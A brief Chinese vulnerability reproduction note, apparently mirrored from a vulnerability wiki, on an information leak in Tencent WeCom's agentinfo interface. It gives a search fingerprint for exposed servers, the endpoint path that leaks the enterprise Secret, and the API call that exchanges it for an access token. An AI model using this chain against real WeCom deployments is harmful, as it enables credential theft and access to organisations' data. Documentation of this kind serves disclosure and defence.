---
title: "腾讯 企业微信 agentinfo 信息泄漏漏洞"
date: 2026-10-23 09:18:52
categories:
  - WebSecurity
  - CVE
  - "其他"
  - "腾讯-企业微信-agentinfo"
tags:
  - "腾讯-企业微信-agentinfo"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

腾讯 企业微信 agentinfo 接口存在信息泄漏漏洞，攻击者通过漏洞可以获取企业微信 Secret

## 漏洞影响

腾讯 企业微信

## 网络测绘

```
web.body="wework_admin.normal_layout"
```

## 漏洞复现

登陆页面

![image-20230828145521417](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/others/images/image-20230828145521417.png)

验证POC

```
/cgi-bin/gateway/agentinfo
```

![image-20230828145533569](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/others/images/image-20230828145533569.png)

获取Token

```
https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=<YOUR_CORPID>&corpsecret=<YOUR_CORPSECRET>
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/others/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
